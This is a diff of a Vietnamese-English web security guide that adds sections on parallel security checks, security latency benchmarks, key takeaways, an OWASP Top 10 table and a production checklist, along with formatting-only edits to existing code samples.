+#### **Optimization 5: Parallel Security Checks**
+
+**❌ Sequential checks (slow):**
+
+```typescript
+app.post('/api/transfer', async (req, res) => {
+  await validateInput(req.body); // 50ms
+  await checkBalance(req.user.id); // 100ms
+  await verifyOTP(req.user.id, req.body.otp); // 200ms
+  await checkDailyLimit(req.user.id); // 80ms
+  // Total: 430ms
+});
+```
+
+**✅ Parallel checks (fast):**
+
+```typescript
+app.post('/api/transfer', async (req, res) => {
+  const [inputValid, balance, otpValid, withinLimit] = await Promise.all([
+    validateInput(req.body),
+    checkBalance(req.user.id),
+    verifyOTP(req.user.id, req.body.otp),
+    checkDailyLimit(req.user.id),
+  ]);
+  // Total: ~200ms (chỉ bằng slowest operation)
+
+  if (!inputValid || balance < req.body.amount || !otpValid || !withinLimit) {
+    return res.status(400).json({ error: 'Validation failed' });
+  }
+
+  // Process transfer
+});
+```
+
+**Impact:** ✅ Giảm latency 50%, better UX
+
+---
+
+### **📊 Security Performance Benchmarks**
+
+| Security Measure          | Latency Added | Mitigation Strategy        | Final Impact |
+| ------------------------- | ------------- | -------------------------- | ------------ |
+| **HTTPS/TLS Handshake**   | +100ms        | HTTP/2, Session resumption | +20ms        |
+| **JWT Verification**      | +5ms          | Cache decoded tokens       | +1ms         |
+| **Input Sanitization**    | +10ms         | Lazy load libraries        | +2ms         |
+| **Rate Limiting (Redis)** | +15ms         | Connection pooling         | +5ms         |
+| **CSP Header**            | 0ms           | No runtime cost            | 0ms          |
+| **CSRF Token Validation** | +8ms          | Parallel checks            | +2ms         |
+
+**Total Security Overhead:** ~30ms (acceptable cho most apps)
+
+---
+
+## **📝 8. TÓM TẮT KEY TAKEAWAYS**
+
+### **🎯 Những Điểm Quan Trọng Nhất**
+
+#### **1. Defense in Depth (Phòng Thủ Đa Tầng)**
+
+```
+Security không phải 1 giải pháp duy nhất - là HỆ THỐNG bảo vệ nhiều tầng:
+
+🛡️ Tầng 1: HTTPS/TLS → Mã hóa transport
+🛡️ Tầng 2: XSS Prevention → Sanitize input/output
+🛡️ Tầng 3: CSRF Protection → Token validation
+🛡️ Tầng 4: Authentication → JWT + HttpOnly cookies
+🛡️ Tầng 5: Secure Storage → Tránh localStorage
+🛡️ Tầng 6: API Security → Rate limiting + CORS
+🛡️ Tầng 7: Security Headers → CSP, HSTS, X-Frame-Options
+
+→ Nếu 1 tầng fail, các tầng khác vẫn protect
+```
+
+---
+
+#### **2. HttpOnly Cookies > localStorage cho Auth Tokens**
+
+```typescript
+// ❌ NGUY HIỂM
+localStorage.setItem('token', accessToken); // XSS có thể steal
+
+// ✅ AN TOÀN
+res.cookie('token', accessToken, {
+  httpOnly: true, // JavaScript KHÔNG access được
+  secure: true, // Chỉ gửi qua HTTPS
+  sameSite: 'strict', // Ngăn CSRF
+});
+```
+
+**Lý do:**
+
+- XSS attack không steal được HttpOnly cookies
+- Browser tự động gửi cookies → UX tốt
+- Server-side control cookies lifecycle
+
+---
+
+#### **3. Never Trust Client-Side**
+
+```typescript
+// ❌ SAI: Chỉ validate ở client
+if (age >= 18) {
+  submitForm(); // Hacker bypass dễ dàng
+}
+
+// ✅ ĐÚNG: Validate CẢ server
+// Client: UX tốt
+if (age < 18) return alert('Must be 18+');
+
+// Server: SECURITY
+if (age < 18) return res.status(400).json({ error: 'Must be 18+' });
+```
+
+**Rule:** Client validation = UX, Server validation = Security
+
+---
+
+#### **4. CSP Headers = Powerful XSS Defense**
+
+```typescript
+Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com
+
+→ Block 95%+ XSS attacks
+→ Control nguồn resources được phép load
+→ Report violations để phân tích
+```
+
+---
+
+#### **5. Rate Limiting Essential**
+
+```typescript
+// Ngăn:
+• Brute-force attacks (đoán password)
+• DDoS attacks
+• API abuse
+
+// Implementation:
+const limiter = rateLimit({
+  windowMs: 60 * 1000,
+  max: 100 // Max 100 requests/phút
+});
+```
+
+---
+
+#### **6. Security = Culture, Not Checklist**
+
+```
+✅ Regular security audits (quarterly)
+✅ Penetration testing (annually)
+✅ Dependency scanning (automated với Snyk)
+✅ Security training cho developers
+✅ Incident response plan
+✅ Security champions trong mỗi team
+```
+
+---
+
+### **🚨 OWASP Top 10 Quick Reference**
+
+| Risk                               | Attack                             | Defense                                      |
+| ---------------------------------- | ---------------------------------- | -------------------------------------------- |
+| **A01: Broken Access Control**     | User access unauthorized resources | Server-side authorization checks             |
+| **A02: Cryptographic Failures**    | Sensitive data exposure            | Encrypt data, HTTPS, HttpOnly cookies        |
+| **A03: Injection (SQL, XSS)**      | Malicious code injection           | Parameterized queries, input sanitization    |
+| **A04: Insecure Design**           | Flawed security architecture       | Threat modeling, secure design patterns      |
+| **A05: Security Misconfiguration** | Default configs, unused features   | Hardening, remove defaults, disable debug    |
+| **A06: Vulnerable Components**     | Outdated dependencies              | npm audit, Snyk, auto-updates                |
+| **A07: Auth Failures**             | Weak auth mechanisms               | Strong passwords, MFA, session timeout       |
+| **A08: Data Integrity Failures**   | Insecure deserialization           | Validate serialized data, digital signatures |
+| **A09: Logging Failures**          | Insufficient monitoring            | Log security events, real-time alerts        |
+| **A10: SSRF**                      | Server-side request forgery        | Whitelist allowed URLs, network segmentation |
+
+---
+
+### **📋 Security Checklist cho Production**
+
+```markdown
+## Frontend Security Checklist
+
+### Authentication & Authorization
+
+- [ ] Access tokens trong HttpOnly cookies (KHÔNG localStorage)
+- [ ] JWT short-lived (15 phút)
+- [ ] Refresh token rotation
+- [ ] Session timeout sau inactivity
+- [ ] Logout clear tất cả tokens
+
+### XSS Prevention
+
+- [ ] DOMPurify cho user-generated HTML
+- [ ] React auto-escape cho text content
+- [ ] CSP headers configured
+- [ ] No eval() hoặc innerHTML với untrusted data
+- [ ] Sanitize URLs (javascript: protocol)
+
+### CSRF Protection
+
+- [ ] CSRF tokens cho state-changing requests
+- [ ] SameSite cookies (Strict hoặc Lax)
+- [ ] Verify Origin/Referer headers
+
+### HTTPS/TLS
+
+- [ ] HTTPS enforced (HTTP redirect)
+- [ ] HSTS header configured
+- [ ] TLS 1.2+ only
+- [ ] Valid SSL certificate
+- [ ] Certificate auto-renewal
+
+### API Security
+
+- [ ] Rate limiting implemented
+- [ ] CORS restricted (NO wildcard \*)
+- [ ] Input validation server-side
+- [ ] Output encoding
+- [ ] Error messages không leak info
+
+### Security Headers
+
+- [ ] Content-Security-Policy
+- [ ] X-Frame-Options: DENY
+- [ ] X-Content-Type-Options: nosniff
+- [ ] Referrer-Policy
+- [ ] Permissions-Policy
+
+### Dependencies
+
+- [ ] npm audit clean (0 vulnerabilities)
+- [ ] Snyk monitoring enabled
+- [ ] Auto-update dependencies (Dependabot)
+- [ ] SRI for CDN scripts
+
+### Sensitive Data
+
+- [ ] Không hardcode secrets
+- [ ] Environment variables cho configs
+- [ ] Không log sensitive data
+- [ ] Encrypt data at rest
+
+### Monitoring & Logging
+
+- [ ] Log security events (login, failures)
+- [ ] Real-time alerts cho suspicious activities
+- [ ] Log retention policy
+- [ ] Incident response plan
+
+### Testing
+
+- [ ] Penetration testing (annually)
+- [ ] Security code reviews
+- [ ] Automated security scans (GitHub Actions)
+- [ ] Bug bounty program
+```
+
+---
+
+### **💡 Final Wisdom**
+
+**"Security không phải feature có thể 'add later' - nó phải được baked in từ đầu."**
+
+**Key Principles:**
+
+1. **Assume Breach**: Design như thể hacker đã inside system
+2. **Least Privilege**: Grant minimum permissions cần thiết
+3. **Defense in Depth**: Multiple layers of protection
+4. **Fail Secure**: Default deny, errors không leak info
+5. **Keep it Simple**: Complex systems = more vulnerabilities
+6. **Regular Updates**: Security landscape thay đổi liên tục
+
+**Security = Journey, Not Destination**
+
+- Threat landscape evolves → Security phải evolve
+- Zero-day vulnerabilities xuất hiện → Cần monitoring
+- New attack vectors → Defense strategies adapt
+
+**Be Paranoid, But Practical:**
+
+- Paranoid: Assume mọi input độc hại, mọi user có thể attacker
+- Practical: Balance security với UX, không làm app unusable
 
 ---
 
@@ -3236,7 +5585,10 @@ async function hashPassword(password: string): Promise<string> {
   return bcrypt.hash(password, salt);
 }
 
-async function verifyPassword(password: string, hash: string): Promise<boolean> {
+async function verifyPassword(
+  password: string,
+  hash: string
+): Promise<boolean> {
   return bcrypt.compare(password, hash);
 }
 
@@ -3253,7 +5605,7 @@ fetch('/api/checkout?creditCard=1234567890123456');
 fetch('/api/checkout', {
   method: 'POST',
   body: JSON.stringify({ creditCard: encrypted }),
-  headers: { 'Content-Type': 'application/json' }
+  headers: { 'Content-Type': 'application/json' },
 });
 
 // 🛡️ Encryption at Rest (Mã hóa dữ liệu lưu trữ)
@@ -3371,7 +5723,7 @@ import rateLimit from 'express-rate-limit';
 const passwordResetLimiter = rateLimit({
   windowMs: 15 * 60 * 1000, // 15 phút
   max: 3, // Tối đa 3 requests
-  message: 'Too many password reset requests. Please try again later.'
+  message: 'Too many password reset requests. Please try again later.',
 });
 
 app.post('/forgot-password', passwordResetLimiter, async (req, res) => {
@@ -3431,14 +5783,14 @@ app.get('/api/users/:id', async (req, res) => {
 // ❌ BAD: Default credentials
 const dbConfig = {
   username: 'admin',
-  password: 'admin123'
+  password: 'admin123',
 };
 
 // ✅ GOOD: Environment-specific configs
 const dbConfig = {
   username: process.env.DB_USERNAME,
   password: process.env.DB_PASSWORD,
-  ssl: process.env.NODE_ENV === 'production'
+  ssl: process.env.NODE_ENV === 'production',
 };
 
 // 🛡️ Security Headers (Express helmet)
@@ -3482,17 +5834,17 @@ const securityChecklist = {
   weekly: [
     'npm audit',
     'Check Snyk/Dependabot PRs',
-    'Review security advisories (GitHub Security tab)'
+    'Review security advisories (GitHub Security tab)',
   ],
   monthly: [
     'Update major versions (test thoroughly)',
-    'Remove unused dependencies (npm-check)'
+    'Remove unused dependencies (npm-check)',
   ],
   beforeDeploy: [
     'npm outdated',
     'npm audit --production',
-    'Verify lockfile integrity'
-  ]
+    'Verify lockfile integrity',
+  ],
 };
 
 // ✅ Subresource Integrity (SRI) cho CDN
@@ -3501,7 +5853,7 @@ const securityChecklist = {
   src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.production.min.js"
   integrity="sha384-KyZXEAg3QhqLMpG8r+Knujsl5+z0z0z..."
   crossorigin="anonymous"
-></script>
+></script>;
 ```
 
 ---
@@ -3545,7 +5897,7 @@ const loginLimiter = rateLimit({
   store: new RedisStore({ client: redisClient }),
   windowMs: 15 * 60 * 1000, // 15 phút
   max: 5, // 5 attempts
-  message: 'Too many login attempts. Account locked for 15 minutes.'
+  message: 'Too many login attempts. Account locked for 15 minutes.',
 });
 
 app.post('/login', loginLimiter, async (req, res) => {
@@ -3578,7 +5930,7 @@ function verifyTOTP(token: string, secret: string): boolean {
     secret,
     encoding: 'base32',
     token,
-    window: 2 // Allow ±2 time steps (60s tolerance)
+    window: 2, // Allow ±2 time steps (60s tolerance)
   });
 }
 
@@ -3660,7 +6012,7 @@ app.post('/login', async (req, res) => {
   const { username, password } = req.body;
   const user = await User.findOne({ username });
 
-  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
+  if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
     return res.status(401).json({ error: 'Invalid credentials' });
     // Không biết ai đang brute force attack!
   }
@@ -3674,8 +6026,8 @@ const securityLogger = winston.createLogger({
   format: winston.format.json(),
   transports: [
     new winston.transports.File({ filename: 'security.log' }),
-    new winston.transports.Console() // Dev only
-  ]
+    new winston.transports.Console(), // Dev only
+  ],
 });
 
 app.post('/login', async (req, res) => {
@@ -3691,7 +6043,7 @@ app.post('/login', async (req, res) => {
       username,
       ip,
       userAgent,
-      timestamp: new Date().toISOString()
+      timestamp: new Date().toISOString(),
     });
 
     return res.status(401).json({ error: 'Invalid credentials' });
@@ -3703,7 +6055,7 @@ app.post('/login', async (req, res) => {
     username,
     ip,
     userAgent,
-    timestamp: new Date().toISOString()
+    timestamp: new Date().toISOString(),
   });
 
   res.json({ token: generateToken(user) });
@@ -3731,7 +6083,7 @@ securityEvents.on('login:failed', (data) => {
       username,
       ip,
       attempts,
-      timestamp: new Date()
+      timestamp: new Date(),
     });
   }
 });
@@ -3746,7 +6098,7 @@ securityEvents.on('login:success', async (data) => {
   if (lastLogin.ip !== ip || lastLogin.userAgent !== userAgent) {
     await sendEmail(user.email, {
       subject: 'New login detected',
-      body: `Login from ${ip} at ${new Date()}. If this wasn't you, reset password immediately.`
+      body: `Login from ${ip} at ${new Date()}. If this wasn't you, reset password immediately.`,
     });
   }
 });
@@ -3763,7 +6115,7 @@ const eventsToLog = [
   'file:upload',
   'admin:action',
   'api:rate:limit',
-  'session:expired'
+  'session:expired',
 ];
 ```
 
